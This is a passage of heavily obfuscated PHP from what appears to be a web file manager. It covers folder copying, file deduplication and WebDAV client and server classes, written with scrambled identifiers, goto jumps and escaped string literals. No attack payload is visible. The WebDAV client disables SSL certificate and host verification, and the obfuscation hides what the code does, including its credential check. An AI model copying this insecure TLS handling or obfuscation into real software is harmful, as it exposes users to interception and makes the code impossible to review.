d†ÕÒĞ¢õ·: $DÂ‘Ğæ¶âÃ =& $_SERVER[¢à]; $AÑ—÷Ğ´“ä = array($DÂ‘Ğæ¶âÃ[498] => array(), $DÂ‘Ğæ¶âÃ[499] => array(), $DÂ‘Ğæ¶âÃ[497] => array(), $DÂ‘Ğæ¶âÃ[534] => array()); $C­“¨¦¹£ = $a„Ï†í½·ï ? $a„Ï†í½·ï : $b„È‚àÆ„Ú->getPathName($b„È‚àÆ„Ú->pathThis($dÈÉÓÌËíö)); goto DÎ‹ˆóÇè; AÖîö½‘òÇ: $this->updateModifyTime($EËÃ‰İÍá—); return $CõÁÀ¶‘’; goto b¦¸êààâï; DÎ‹ˆóÇè: $eÂÕ¶ä­Â = $this->fileNameExist($EËÃ‰İÍá—, $C­“¨¦¹£); $CõÁÀ¶‘’ = $this->mkdir($EËÃ‰İÍá—, $C­“¨¦¹£, $F‚Ï†Ğí†È); if (!$eÂÕ¶ä­Â || $F‚Ï†Ğí†È == REPEAT_RENAME_FOLDER) { $F‚Ï†Ğí†È = !1; } goto BÙİŸš²…; d³à•¦½•: Hook::trigger($DÂ‘Ğæ¶âÃ[536]); if ($CõÁÀ¶‘’) { $this->folderSizeResetChildren($CõÁÀ¶‘’); } $this->_childrenListClear(); goto C¯”ê…Ö; b¦¸êààâï: } private function _copyChildTo($eŒÂÎ” ²É, $e¤‚­ÜŞ¨, $DÃ£‰ÉÁîƒ, $eå×½Ö±, &$EÌØÒôØ´Â, $B´©çƒÇ£) { goto a‰ñÕÛÀ„; a‰ñÕÛÀ„: $A¥ÀÄæÁõ =& $_SERVER[¢à]; $f…í³†øºÄ = $this->sourceInfoCache($DÃ£‰ÉÁîƒ); $C¹ñÖá‚Ì = $eŒÂÎ” ²É->listPath($e¤‚­ÜŞ¨, !1, !0); goto fİ®Ã¯ÚÍï; c¸¨ğ°¸É: $dáË»ÕÒ½“ = $this->_childrenList($DÃ£‰ÉÁîƒ); $dáË»ÕÒ½“ = array_to_keyvalue($dáË»ÕÒ½“, $A¥ÀÄæÁõ[28]); foreach ($aš«˜Ç¤¿… as $FÎ†Ë‰ãéí) { $d¥šÈÈİğì = $dáË»ÕÒ½“[$FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]]]; $A”–´§À¡ = $d¥šÈÈİğì[$A¥ÀÄæÁõ[366]]; $this->_copyApplyMeta($d¥šÈÈİğì, $EÌØÒôØ´Â); if ($FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[29]] == $A¥ÀÄæÁõ[76]) { $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[75]] = $eŒÂÎ” ²É->getPathInner($FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[75]]); $this->_copyChildTo($eŒÂÎ” ²É, $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[75]], $A”–´§À¡, $eå×½Ö±, $EÌØÒôØ´Â, $B´©çƒÇ£); } } goto AëÎ†‰à¼İ; E‚Æ»º‰õˆ: foreach ($aš«˜Ç¤¿… as &$FÎ†Ë‰ãéí) { goto bŒ…Ñ£Ø”Ø; dÚŞÄ¾ÒØÂ: if ($eå×½Ö±) { $Aˆ£–ŠÑ¼£ = $this->fileNameExistCache($DÃ£‰ÉÁîƒ, $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]]); if ($Aˆ£–ŠÑ¼£) { if ($FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[367]] || $eå×½Ö± == REPEAT_SKIP) { continue; } if ($eå×½Ö± == REPEAT_REPLACE) { $d¥šÈÈİğì = $this->sourceInfoCache($Aˆ£–ŠÑ¼£); $A¼ìéÜ‡ÛØ = $this->fileHistory($d¥šÈÈİğì, $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]], $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[77]]); if ($A¼ìéÜ‡ÛØ) { $EÌØÒôØ´Â[$A¥ÀÄæÁõ[497]][] = $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]]; } continue; } else { if ($eå×½Ö± == REPEAT_RENAME) { $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]] = $this->fileNameAutoCache($DÃ£‰ÉÁîƒ, $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]], $eå×½Ö±, !1); } } } } if (!$FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[367]] && $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]]) { $EÌØÒôØ´Â[$A¥ÀÄæÁõ[497]][] = $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]]; } $cê¶î¶ç[] = $this->_makeItemData($FÎ†Ë‰ãéí, $f…í³†øºÄ, $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]]); goto dÇ‰Èó¶Ş¢; D«œà½£ø¼: $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[77]] = _get($FÎ†Ë‰ãéí, $A¥ÀÄæÁõ[77], 0); $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]] = _get($FÎ†Ë‰ãéí, $A¥ÀÄæÁõ[415], 0); if (!isset($FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[537]]) && $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]]) { $EÌØÒôØ´Â[$A¥ÀÄæÁõ[534]][] = $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[415]]; } goto dÚŞÄ¾ÒØÂ; bŒ…Ñ£Ø”Ø: if (isset($eÍˆÍ„µ™[$FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]]])) { $FÎ†Ë‰ãéí = $eÍˆÍ„µ™[$FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[28]]]; } $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[367]] = $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[29]] == $A¥ÀÄæÁõ[76]; $FÎ†Ë‰ãéí[$A¥ÀÄæÁõ[369]] = _get($FÎ†Ë‰ãéí, $A¥ÀÄæÁõ[157], $A¥ÀÄæÁõ[33]); goto D«œà½£ø¼; dÇ‰Èó¶Ş¢: } unset($FÎ†Ë‰ãéí); if (!empty($cê¶î¶ç)) { $this->addAll($cê¶î¶ç); } goto c¸¨ğ°¸É; fİ®Ã¯ÚÍï: $aš«˜Ç¤¿… = array_merge($C¹ñÖá‚Ì[$A¥ÀÄæÁõ[73]], $C¹ñÖá‚Ì[$A¥ÀÄæÁõ[74]]); $eÍˆÍ„µ™ = $this->_addFiles($eŒÂÎ” ²É, $C¹ñÖá‚Ì[$A¥ÀÄæÁõ[73]], $B´©çƒÇ£); $cê¶î¶ç = array(); goto E‚Æ»º‰õˆ; AëÎ†‰à¼İ: } private function _addFiles($b†ï¦–¾ÓŞ, $eá¯ƒÖíò‘, $DÇá‘ÀÕæÚ) { goto E«´¥‡ë›ì; eÈ×’ÜŠ£Ç: foreach ($AŠªˆ›Àë¡ as $Eö¶Û“Öª) { if (!isset($e³¦©ÛÛ¬İ[$Eö¶Û“Öª[$e‰¦‰”Ç°Ã[160]]])) { continue; } $d‡¦–é¹³ =& $e³¦©ÛÛ¬İ[$Eö¶Û“Öª[$e‰¦‰”Ç°Ã[160]]]; foreach ($d‡¦–é¹³ as &$BÊ·æ÷ò¤) { $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[415]] = $Eö¶Û“Öª[$e‰¦‰”Ç°Ã[415]]; } unset($BÊ·æ÷ò¤); } $a…†¢ºî† = array(); foreach ($eá¯ƒÖíò‘ as $eæ¸ù…Éù¯) { $a…†¢ºî†[$eæ¸ù…Éù¯[$e‰¦‰”Ç°Ã[28]]] = $eæ¸ù…Éù¯; } goto dµçÅœë‹; E«´¥‡ë›ì: $e‰¦‰”Ç°Ã =& $_SERVER[¢à]; if (!$eá¯ƒÖíò‘ || count($eá¯ƒÖíò‘) == 0) { return array(); } $e³¦©ÛÛ¬İ = array(); goto D®Ôª¹ÅŒÀ; dµçÅœë‹: return $a…†¢ºî†; goto Bä°ˆÜÓ‰ò; D®Ôª¹ÅŒÀ: foreach ($eá¯ƒÖíò‘ as &$BÊ·æ÷ò¤) { goto D“°õêÀµ§; BÏÂ¡™àŒ: if (count($e³¦©ÛÛ¬İ[$fÖ„÷¾ËÔ]) > 1) { $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[537]] = !0; } goto BŸÊò¿äï©; D“°õêÀµ§: Hook::trigger($e‰¦‰”Ç°Ã[538], $BÊ·æ÷ò¤); $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[75]] = $b†ï¦–¾ÓŞ->getPathInner($BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[75]]); $A¢‰«¿²† = $b†ï¦–¾ÓŞ->hashSimple($BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[75]]); goto F„¡ùÃ½ĞŠ; F„¡ùÃ½ĞŠ: $fÖ„÷¾ËÔ = $b†ï¦–¾ÓŞ->hashMd5($BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[75]]); if (strlen($fÖ„÷¾ËÔ) > 10 && !isset($e³¦©ÛÛ¬İ[$fÖ„÷¾ËÔ])) { $e³¦©ÛÛ¬İ[$fÖ„÷¾ËÔ] = array(); } $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[161]] = $A¢‰«¿²†; goto FŠ«ŞÛ”ô‹; FŠ«ŞÛ”ô‹: $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[160]] = $fÖ„÷¾ËÔ; Hook::trigger($e‰¦‰”Ç°Ã[539], $BÊ·æ÷ò¤); $e³¦©ÛÛ¬İ[$fÖ„÷¾ËÔ][] =& $BÊ·æ÷ò¤; goto BÏÂ¡™àŒ; BŸÊò¿äï©: } $FÆˆÄ‰‹µó = array($e‰¦‰”Ç°Ã[160] => array($e‰¦‰”Ç°Ã[7], array_keys($e³¦©ÛÛ¬İ))); $C£»¨ó„†‚ = Model($e‰¦‰”Ç°Ã[540]); goto AåŸ„ÊÔĞ; AåŸ„ÊÔĞ: $AŠªˆ›Àë¡ = $C£»¨ó„†‚->where($FÆˆÄ‰‹µó)->select(); $AŠªˆ›Àë¡ = $AŠªˆ›Àë¡ ? $AŠªˆ›Àë¡ : array(); foreach ($AŠªˆ›Àë¡ as $Eö¶Û“Öª) { if (!isset($e³¦©ÛÛ¬İ[$Eö¶Û“Öª[$e‰¦‰”Ç°Ã[160]]])) { continue; } $bÉä‡†À± = $e³¦©ÛÛ¬İ[$Eö¶Û“Öª[$e‰¦‰”Ç°Ã[160]]]; foreach ($bÉä‡†À± as &$BÊ·æ÷ò¤) { $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[415]] = $Eö¶Û“Öª[$e‰¦‰”Ç°Ã[415]]; $BÊ·æ÷ò¤[$e‰¦‰”Ç°Ã[537]] = !0; } unset($BÊ·æ÷ò¤); } goto Eµé±Ã¥İ; Eµé±Ã¥İ: $c“…­—ÜÊÑ = array(); foreach ($eá¯ƒÖíò‘ as $D°˜‚òÕ§œ) { if (isset($D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[537]]) && $D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[537]]) { continue; } $a¯Ã™‚ˆ½ë = $b†ï¦–¾ÓŞ->getPathInner($D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[75]]); $A²»åÜ î“ = $C£»¨ó„†‚->addFileMake($a¯Ã™‚ˆ½ë, $D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[77]], $D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[161]], $D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[160]], $D°˜‚òÕ§œ[$e‰¦‰”Ç°Ã[28]], $DÇá‘ÀÕæÚ); $c“…­—ÜÊÑ[] = $A²»åÜ î“; } $C£»¨ó„†‚->addAll($c“…­—ÜÊÑ); goto A©¿¤å‰»½; A©¿¤å‰»½: $FÆˆÄ‰‹µó = array($e‰¦‰”Ç°Ã[160] => array($e‰¦‰”Ç°Ã[7], array_keys($e³¦©ÛÛ¬İ))); $AŠªˆ›Àë¡ = $C£»¨ó„†‚->where($FÆˆÄ‰‹µó)->select(); $AŠªˆ›Àë¡ = $AŠªˆ›Àë¡ ? $AŠªˆ›Àë¡ : array(); goto eÈ×’ÜŠ£Ç; Bä°ˆÜÓ‰ò: } } define($_SERVER[¢à][541], $_SERVER[¢à][542]); goto C¨ŞÄ¢†œ; FòÍŞÂËÎ: class HttpDavClient { public function __construct($F®«ºíÙ³¦, $A†‚¯¿‘÷Ë, $Dö¶†¦Á‚Ê) { $this->header = array(); $this->userName = $A†‚¯¿‘÷Ë; $this->userPassowrd = $Dö¶†¦Á‚Ê; } protected function makePath($a³§ì¶ÑÌ“) { return $a³§ì¶ÑÌ“; } protected function setHeader($F†ÙÚİÁ÷İ, $E“Ó‰ÄØñ¡ = false) { if ($E“Ó‰ÄØñ¡ === !1) { $this->header[] = $F†ÙÚİÁ÷İ; } else { $this->header[] = $F†ÙÚİÁ÷İ . $_SERVER[¢à][878] . $E“Ó‰ÄØñ¡; } } public function move($bğëùë××ğ, $CçÎ£•§Ã, $c„ÔÃæêùÈ = '') { $Dã‡ˆ”‰© =& $_SERVER[¢à]; $this->setHeader($Dã‡ˆ”‰©[1740], $this->makePath($CçÎ£•§Ã)); $this->setHeader($Dã‡ˆ”‰©[1741], $Dã‡ˆ”‰©[1742]); if ($c„ÔÃæêùÈ) { $this->setHeader($Dã‡ˆ”‰©[1743], $Dã‡ˆ”‰©[923] . $c„ÔÃæêùÈ . $Dã‡ˆ”‰©[926]); } return $this->send($Dã‡ˆ”‰©[1744], $bğëùë××ğ); } public function copy($eã¿ñõì–‡, $BİØĞ¡ˆÒµ) { $fÆÜÃÄŒ½– =& $_SERVER[¢à]; $this->setHeader($fÆÜÃÄŒ½–[1740], $this->makePath($BİØĞ¡ˆÒµ)); $this->setHeader($fÆÜÃÄŒ½–[1741], $fÆÜÃÄŒ½–[1742]); return $this->send($fÆÜÃÄŒ½–[1745], $eã¿ñõì–‡); } public function mkcol($b¸Â‘‹á·§) { $E­Ëøâˆ‘• =& $_SERVER[¢à]; $this->setHeader($E­Ëøâˆ‘•[1741], $E­Ëøâˆ‘•[1742]); return $this->send($E­Ëøâˆ‘•[1746], $b¸Â‘‹á·§); } public function delete($E‰Ÿ½ƒ—œø, $aÜ‚†‚Ìáµ = '') { $C•ÍäØƒ =& $_SERVER[¢à]; if ($aÜ‚†‚Ìáµ) { $this->setHeader($C•ÍäØƒ[1743], $C•ÍäØƒ[923] . $aÜ‚†‚Ìáµ . $C•ÍäØƒ[926]); } return $this->send($C•ÍäØƒ[1240], $E‰Ÿ½ƒ—œø); } public function propfind($f½ÖŸ­ì®) { $EíµãÊî—­ =& $_SERVER[¢à]; $this->setHeader($EíµãÊî—­[1747], $EíµãÊî—­[83]); $this->setHeader($EíµãÊî—­[1748], $EíµãÊî—­[1749]); $cÓÊêÂéˆä = $EíµãÊî—­[1750]; return $this->send($EíµãÊî—­[1751], $f½ÖŸ­ì®, $cÓÊêÂéˆä); } public function options($cÇ¼í„…Š) { return $this->send($_SERVER[¢à][1752], $cÇ¼í„…Š); } public function get($ağ½®ù§Êä) { return $this->send($_SERVER[¢à][213], $ağ½®ù§Êä); } public function put($eƒí–Æ•ÅÙ, $Bß»ì‘çæ, $få¤Ù•³ Ğ = '') { $C‡ÅÖ•‹«‡ =& $_SERVER[¢à]; if ($få¤Ù•³ Ğ) { $this->setHeader($C‡ÅÖ•‹«‡[1743], $C‡ÅÖ•‹«‡[923] . $få¤Ù•³ Ğ . $C‡ÅÖ•‹«‡[926]); } return $this->send($C‡ÅÖ•‹«‡[211], $eƒí–Æ•ÅÙ, $Bß»ì‘çæ); } protected function send($e±†Ø…İ½©, $E›Ÿ¥Ÿ•£¸, $AªÂó°Ô = false, $AåÆØî¬ò = false) { goto EÂ¤›õ±†; Açè½Áš¨´: curl_setopt($aõ©¹°¼Û, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($aõ©¹°¼Û, CURLOPT_SSL_VERIFYHOST, !1); $c£ Ş…Ï›È = curl_exec($aõ©¹°¼Û); goto EÁÉé¼À É; d™İÀ¡Ë¥µ: $aõ©¹°¼Û = curl_init($E›Ÿ¥Ÿ•£¸); curl_setopt($aõ©¹°¼Û, CURLOPT_CUSTOMREQUEST, $e±†Ø…İ½©); curl_setopt($aõ©¹°¼Û, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto CÍÊğóğ—; EÁÉé¼À É: $this->header = array(); return $c£ Ş…Ï›È; goto fƒÁœÂ¤Á; eëÓñ…¯¹¶: $this->setHeader($e÷èæÂ£ƒô); if ($AªÂó°Ô) { $AªÂó°Ô = $f²­‡ôæ—º[1754] . $AªÂó°Ô; } if (!request_url_safe($E›Ÿ¥Ÿ•£¸)) { return !1; } goto d™İÀ¡Ë¥µ; EÂ¤›õ±†: $f²­‡ôæ—º =& $_SERVER[¢à]; $e÷èæÂ£ƒô = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($f²­‡ôæ—º[1753], $f²­‡ôæ—º[50]); goto eëÓñ…¯¹¶; CÍÊğóğ—: curl_setopt($aõ©¹°¼Û, CURLOPT_HTTPHEADER, $this->header); curl_setopt($aõ©¹°¼Û, CURLOPT_RETURNTRANSFER, !0); curl_setopt($aõ©¹°¼Û, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Açè½Áš¨´; fƒÁœÂ¤Á: } } class HttpDavServer { public function __construct($b—ÄÙ„‡œ, $dÃšÌĞĞè) { $this->root = $b—ÄÙ„‡œ; $this->initPath($dÃšÌĞĞè); $this->start(); } public function initPath($Bùô¼ëË‡¾) { $B±©‰½¨¡ =& $_SERVER[¢à]; $eÕÌÂÙ†âÊ = rtrim($_SERVER[$B±©‰½¨¡[1363]], $B±©‰½¨¡[8]) . $B±©‰½¨¡[8]; $this->urlBase = substr($eÕÌÂÙ†âÊ, 0, strpos($eÕÌÂÙ†âÊ, $Bùô¼ëË‡¾) + 1); $this->urlBase = rtrim($this->urlBase, $B±©‰½¨¡[8]) . $Bùô¼ëË‡¾; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $FÑ–„Ûáö =& $_SERVER[¢à]; $dƒ’ùÏ™Œò = HttpAuth::get(); if ($dƒ’ùÏ™Œò[$FÑ–„Ûáö[531]] == $FÑ–„Ûáö[1755] && $dƒ’ùÏ™Œò[$FÑ–„Ûáö[895]] == $FÑ–„Ûáö[1756]) { return !0; } HttpAuth::error(); } public function start() { goto A«ïâ¤ä››; A«ïâ¤ä››: $AñÄáª½õĞ =& $_SERVER[¢à]; $this->checkUser(); $eÀ‰ä­¿‚¢ = $AñÄáª½õĞ[143] . HttpHeader::method(); goto fÛ‚ ’µºå; fÛ‚ ’µºå: if (!method_exists($this, $eÀ‰ä­¿‚¢)) { pr($eÀ‰ä­¿‚¢ . $AñÄáª½õĞ[1757]); die; } $EóÓñÏ‹Ô = array($AñÄáª½õĞ[1758], $AñÄáª½õĞ[1759]); if (!in_array($eÀ‰ä­¿‚¢, $EóÓñÏ‹Ô) && !$this->pathExists($this->path)) { $BÉ‡ÌŠ­ò = array($AñÄáª½õĞ[1028] => 404); } else { $BÉ‡ÌŠ­ò = $this->{$eÀ‰ä­¿‚¢}(); } goto aè‡ÈÚºåô; aè‡ÈÚºåô: if (!$BÉ‡ÌŠ­ò) { return; } self::response($BÉ‡ÌŠ­ò); goto EÃĞŠ–«§Â; EÃĞŠ–«§Â: } public function pathGet($B¶±Ø«±Ş° = false) { $fÕ™©Àí…› =& $_SERVER[¢à]; $cá ‹Œ²¬Ò = $B¶±Ø«±Ş° ? $_SERVER[$fÕ™©Àí…›[1760]] : $_SERVER[$fÕ™©Àí…›[1363]]; $cá ‹Œ²¬Ò = KodIO::clear(rawurldecode($cá ‹Œ²¬Ò)); if (!strstr($cá ‹Œ²¬Ò, KodIO::clear($this->urlBase))) { return !1; } return substr($cá ‹Œ²¬Ò, strpos($cá ‹Œ²¬Ò, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($f—£µØ¿Í·) { return file_exists($f—£µØ¿Í·); } public function pathMkdir($FËøÃ¢ë®) { return mkdir($FËøÃ¢ë®, 511, !0); } public function pathInfo($FİÃ¨™Í×Ù) { return path_info($FİÃ¨™Í×Ù); } public function pathList($b…À–‰…»‘) { return path_list($b…À–‰…»‘); } public function pathOut($d›Ëè¢ªØÏ) { echo file_get_contents($d›Ëè¢ªØÏ); } public function pathPut($aâŒéãçË, $b—ÃÎ¯áÊ = '') { if (!$b—ÃÎ¯áÊ) { return file_put_contents($aâŒéãçË, $_SERVER[¢à][33]); } return move_path($b—ÃÎ¯áÊ, $aâŒéãçË); } public function pathRemove($fµà«øä‚) { if (is_file($fµà«øä‚)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($cíŞ–÷ë÷‚, $F§‰îÛÒ¯å) { return move_path($cíŞ–÷ë÷‚, $F§‰îÛÒ¯å); } public function pathCopy($d÷ï–ù¦–, $B»Ù¯í††) { return copy_dir($d÷ï–ù¦–, $B»Ù¯í††); } public function parsePath($E¿°Ïáö õ) { return $E¿°Ïáö õ; } public function parseItem($b·¦ƒ„ß»©, $a¼¿²™ƒİè) { goto eîôèø¤; eîôèø¤: $eŒ–Ø˜·‰ =& $_SERVER[¢à]; $aç‘èñ”Å¢ = $this->pathGet() . $eŒ–Ø˜·‰[8] . $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[28]]; $aç‘èñ”Å¢ = $eŒ–Ø˜·‰[8] . str_replace($eŒ–Ø˜·‰[169], $eŒ–Ø˜·‰[8], rawurlencode($aç‘èñ”Å¢)); goto E»²æÓö÷; eƒ²¢ôÁ: $cˆğÅÍ‰‚í = array($eŒ–Ø˜·‰[1761] => KodIO::clear($this->urlBase . $aç‘èñ”Å¢), $eŒ–Ø˜·‰[107] => @gmdate($eŒ–Ø˜·‰[1762], $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[107]]), $eŒ–Ø˜·‰[184] => @gmdate($eŒ–Ø˜·‰[1763], $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[184]]), $eŒ–Ø˜·‰[77] => $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[77]] ? $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[77]] : 0); return $cˆğÅÍ‰‚í; goto B‰¹«ÁÇÊÁ; E»²æÓö÷: if ($a¼¿²™ƒİè) { $aç‘èñ”Å¢ = $eŒ–Ø˜·‰[8] . str_replace($eŒ–Ø˜·‰[169], $eŒ–Ø˜·‰[8], rawurlencode($this->pathGet())); } if (!trim($b·¦ƒ„ß»©[$eŒ–Ø˜·‰[107]])) { $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[107]] = time(); } if (!trim($b·¦ƒ„ß»©[$eŒ–Ø˜·‰[184]])) { $b·¦ƒ„ß»©[$eŒ–Ø˜·‰[184]] = time(); } goto eƒ²¢ôÁ; B‰¹«ÁÇÊÁ: } public function parseItemXml($d¡´‚çÔ…, $D¨Ó¡ˆƒØí) { $eÊÅ¨ğ¥Ø =& $_SERVER[¢à]; $d¸ÓƒÄ›„› = $this->parseItem($d¡´‚çÔ…, $D¨Ó¡ˆƒØí); if ($d¡´‚çÔ…[$eÊÅ¨ğ¥Ø[29]] == $eÊÅ¨ğ¥Ø[76]) { $D¾ˆÕÜ×ˆ = $eÊÅ¨ğ¥Ø[1764]; $D¾ˆÕÜ×ˆ .= $eÊÅ¨ğ¥Ø[1765]; } else { $b˜É®ïàŸ¶ = $d¡´‚çÔ…[$eÊÅ¨ğ¥Ø[157]] ? $d¡´‚çÔ…[$eÊÅ¨ğ¥Ø[157]] : get_path_ext($d¡´‚çÔ…[$eÊÅ¨ğ¥Ø[28]]); $aÚ¿ôÑ‰´î = get_file_mime($b˜É®ïàŸ¶); $D¾ˆÕÜ×ˆ = $eÊÅ¨ğ¥Ø[1766]; $D¾ˆÕÜ×ˆ .= "\x3c\x44\x3a\147\145\164\x63\157\x6e\x74\x65\x6e\x74\164\171\x70\145\76{$aÚ¿ôÑ‰´î}\74\57\104\72\x67\145\x74\143\157\156\x74\x65\x6e\164\x74\171\x70\145\76"; } return "\12\x9\11\74\104\x3a\x72\x65\x73\x70\x6f\156\x73\145\x3e\xa\11\11\x9\x3c\104\x3a\x68\x72\145\146\76{$d¸ÓƒÄ›„›[$eÊÅ¨ğ¥Ø[1761]]}\74\57\x44\72\x68\x72\145\x66\76\xa\x9\x9\11\x3c\104\72\160\162\157\160\x73\164\x61\x74\76\xa\11\x9\11\x9\74\x44\x3a\160\x72\x6f\160\76\xa\11\x9\11\x9\11\x3c\x44\72\x67\145\x74\x6c\141\x73\164\155\157\x64\151\x66\x69\145\144\x3e{$d¸ÓƒÄ›„›[$eÊÅ¨ğ¥Ø[107]]}\x3c\x2f\x44\72\147\145\164\x6c\141\163\x74\x6d\x6f\144\x69\x66\151\x65\144\76\xa\x9\x9\11\x9\11\74\x44\72\x63\162\145\x61\x74\x69\157\156\x64\141\x74\145\x3e{$d¸ÓƒÄ›„›[$eÊÅ¨ğ¥Ø[184]]}\x3c\x2f\x44\x3a\143\x72\145\141\x74\x69\x6f\x6e\144\x61\x74\145\76\xa\11\11\11\11\11\x3c\x44\x3a\147\x65\164\x63\x6f\x6e\x74\x65\156\164\x6c\x65\x6e\x67\164\x68\76{$d¸ÓƒÄ›„›[$eÊÅ¨ğ¥Ø[77]]}\74\57\x44\x3a\147\145\164\143\157\156\164\x65\x6e\x74\154\145\156\147\164\150\76\12\11\x9\11\x9\x9{$D¾ˆÕÜ×ˆ}\xa\x9\x9\11\x9\x3c\57\104\72\x70\162\x6f\160\76\12\x9\x9\x9\x9\74\x44\72\163\x74\x61\164\x75\x73\76\110\124\x54\x50\57\x31\x2e\x31\x20\62\60\x30\40\117\113\x3c\57\104\x3a\x73\x74\x61\164\x75\x73\76\xa\11\11\x9\74\x2f\104\x3a\160\x72\x6f\x70\163\x74\141\x74\76\xa\x9\11\74\x2f\x44\72\x72\145\x73\160\x6f\156\163\x65\x3e"; } public function pathListMerge($aƒŞ¾ñíš‚) { goto fÜîŠ’†¹; fÜîŠ’†¹: $e¸‚±ˆÔÒ =& $_SERVER[¢à]; if (!$aƒŞ¾ñíš‚) { return $aƒŞ¾ñíš‚; } $cÙ„ëÛéé… = array($e¸‚±ˆÔÒ[73], $e¸‚±ˆÔÒ[74], $e¸‚±ˆÔÒ[1767]); goto eØÇ¶ŠëÛ»; A‹æ‹¤Å²ò: return $CÆµô´ïäì; goto C„§«ÄòÍ…; eØÇ¶ŠëÛ»: $CÆµô´ïäì = array(); foreach ($aƒŞ¾ñíš‚ as $cêÁÒŒ¥« => $Aàˆ™Ó²¢­) { if (!in_array($cêÁÒŒ¥«, $cÙ„ëÛéé…) || !is_array($Aàˆ™Ó²¢­)) { continue; } $CÆµô´ïäì = array_merge($CÆµô´ïäì, $Aàˆ™Ó²¢­); } foreach ($CÆµô´ïäì as &$CØƒœÉ°”) { $CØƒœÉ°”[$e¸‚±ˆÔÒ[28]] = str_replace($e¸‚±ˆÔÒ[8], $e¸‚±ˆÔÒ[1365], $CØƒœÉ°”[$e¸‚±ˆÔÒ[28]]); } goto A‹æ‹¤Å²ò; C„§«ÄòÍ…: } public function httpPROPFIND() { goto bª‚ÅùŞ¡; b‹”Î¨¸ñ”: if ($BŠ²¾“–õ‰) { $eÃôù‘ßô = array($a¸˜İ¶¦ƒå); } else { $a¸˜İ¶¦ƒå[$E¯„„šêƒß[28]] = $E¯„„šêƒß[33]; $eÃôù‘ßô = array_merge(array($a¸˜İ¶¦ƒå), $eÃôù‘ßô); } $D»Ü¼’–”„ = $E¯„„šêƒß[33]; foreach ($eÃôù‘ßô as $bŸ¬îä³‰Û) { $D»Ü¼’–”„ .= $this->parseItemXml($bŸ¬îä³‰Û, $BŠ²¾“–õ‰); } goto Aø•™¥Æ†¥; bª‚ÅùŞ¡: $E¯„„šêƒß =& $_SERVER[¢à]; $EØïšÙÍãÑ = $this->pathList($this->path); $eÃôù‘ßô = $this->pathListMerge($EØïšÙÍãÑ); goto c«ïÚÔ÷Æˆ; c«ïÚÔ÷Æˆ: $a¸˜İ¶¦ƒå = $EØïšÙÍãÑ[$E¯„„šêƒß[1768]]; if (!is_array($eÃôù‘ßô) || $a¸˜İ¶¦ƒå[$E¯„„šêƒß[1769]] === !1) { return array($E¯„„šêƒß[1770] => 404, $E¯„„šêƒß[1771] => $E¯„„šêƒß[1772]); } $BŠ²¾“–õ‰ = $a¸˜İ¶¦ƒå[$E¯„„šêƒß[29]] == $E¯„„šêƒß[164] || HttpHeader::get($E¯„„šêƒß[1747]) == $E¯„„šêƒß[464]; goto b‹”Î¨¸ñ”; Aø•™¥Æ†¥: return array($E¯„„šêƒß[1770] => 207, $E¯„„šêƒß[1771] => "\74\x44\x3a\x6d\x75\x6c\x74\x69\x73\164\x61\164\165\163\40\x78\155\x6c\156\163\x3a\104\x3d\42\104\x41\x56\72\x22\x3e\12{$D»Ü¼’–”„}\xa\74\x2f\x44\72\155\165\154\164\x69\x73\164\141\x74\165\x73\76"); goto C‰ø›¢ˆ; C‰ø›¢ˆ: } public function httpHEAD() { $eµà“°«¥ï =& $_SERVER[¢à]; $BŠÁ¥˜Û¼‰ = $this->pathInfo($this->path); if (!$BŠÁ¥˜Û¼‰ || $BŠÁ¥˜Û¼‰[$eµà“°«¥ï[29]] == $eµà“°«¥ï[76]) { return array($eµà“°«¥ï[1028] => 200, $eµà“°«¥ï[1196] => array($eµà“°«¥ï[1773])); } return array($eµà“°«¥ï[1028] => 200, 